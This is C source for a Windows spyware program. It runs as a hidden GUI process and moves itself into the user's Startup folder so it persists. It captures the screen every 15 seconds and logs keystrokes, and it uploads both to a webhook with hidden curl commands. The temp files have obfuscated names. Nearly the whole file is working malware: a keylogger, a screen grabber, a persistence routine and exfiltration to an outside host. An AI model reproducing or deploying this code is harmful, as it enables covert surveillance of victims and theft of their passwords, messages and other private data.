#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#define STB_IMAGE_WRITE_IMPLEMENTATION
#include "stb_image_write.h"
#define CMD_EXEC(cmd)(WinExec(cmd, SW_HIDE))
#define MS_TO_S(n)((n)*1000)

DWORD WINAPI Screenshot(void *data);
DWORD WINAPI Keylog(void *data);
void capture_screen(const char *filename);
void log_keystroke();
int move_to_startup(const char *file_path);
char *get_exe_name();

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow){
    move_to_startup(get_exe_name());
    chdir(getenv("TEMP"));
    CreateThread(NULL, 0, Screenshot, NULL, 0, NULL);
    CreateThread(NULL, 0, Keylog, NULL, 0, NULL);
    while(1);
    return 0;
}

DWORD WINAPI Screenshot(void *data){
    char buf1[256];
    while(1){
        Sleep(MS_TO_S(15));
        capture_screen("7a616d6e.tmp");
        sprintf(buf1, "curl -X POST -F \"file=@7a616d6e.tmp;filename=tmp.png\" %s", WEBHOOK);
        CMD_EXEC(buf1);
    }
}

DWORD WINAPI Keylog(void *data){
    char buf2[256];
    while(1){
        log_keystroke();
        sprintf(buf2, "curl -X POST -F \"file=@626f6e67.tmp;filename=tmp.txt\" %s", WEBHOOK);
        CMD_EXEC(buf2);
        Sleep(MS_TO_S(1));
    }
}

void capture_screen(const char *filename){
    int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
    HDC scr = GetDC(0), mem = CreateCompatibleDC(scr);
    HBITMAP bmp = CreateCompatibleBitmap(scr, w, h);
    SelectObject(mem, bmp);
    BitBlt(mem, 0, 0, w, h, scr, 0, 0, SRCCOPY);            // copy screen pixels from scr to mem with their coordinates
    BITMAPINFO bi = {{sizeof(BITMAPINFOHEADER), w, -h, 1, 24, BI_RGB}}; // define a bitmap info structure (24 bits per pixels, /8=3 bytes = rgb size of a single pixel)
    char *buf = malloc(3*w*h);                              // allocate the size of image (3* is bc it's rgb)
    GetDIBits(mem, bmp, 0, h, buf, &bi, DIB_RGB_COLORS);    // take pixels in mem and write them into buf
    stbi_write_png(filename, w, h, 3, buf, w*3); 
    free(buf); 
    DeleteObject(bmp);
    DeleteDC(mem); 
    ReleaseDC(0, scr);
}

void log_keystroke(){
    FILE *fp = fopen("626f6e67.tmp", "w");
    int size = 0;
    while(size<150){                                        // each 0.1 kb
        for(char i=0; i<127; i++){
        if(GetAsyncKeyState(i) & 0x8000){                   // check if a key is pressed
                Sleep(100);                                 // ideal sleep time (if you type fast js like me, it will ignore some keys btw)
                switch (i){                                 // handle special cases
                    case 0: break;                          // idk
                    case 1: break;                          // RIGHT MOUSE CLICK
                    case 2: break;                          // LEFT MOUSE CLICK
                    case 8: fputs("[DEL]", fp); size+=5; break;
                    case 16: fputs("[SHIFT]", fp); size+=7; break;
                    case 17: fputs("[CTRL]", fp); size+=6; break;
                    case 18: fputs("[ALT]", fp); size+=5; break;
                    case 20: fputs("[CAPS]", fp); size+=6; break;
                    default: fputc(i, fp); size++; break;
                }
            }
        }
    }
    fclose(fp);
}

/* i'm too lazy to implement other persistence techniques.
read this https://hadess.io/the-art-of-windows-persistence/ */

int move_to_startup(const char *file){                       // 1 successfully moved, -1 error, 0 already in
    char current_path[MAX_PATH];
    GetModuleFileName(NULL, current_path, MAX_PATH);
    char destination_path[MAX_PATH];
    sprintf(destination_path, "%s\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\%s", getenv("APPDATA"), file);
    if(strcmp(current_path, destination_path)) return MoveFile(current_path, destination_path)?1:-1;
    return 0;
}

char *get_exe_name(){
    char exe_path[MAX_PATH];
    GetModuleFileName(NULL, exe_path, MAX_PATH);
    char *exe_name = strrchr(exe_path, '\\');
    if(exe_name != NULL) exe_name++;
    else exe_name = exe_path;
    return exe_name;
}
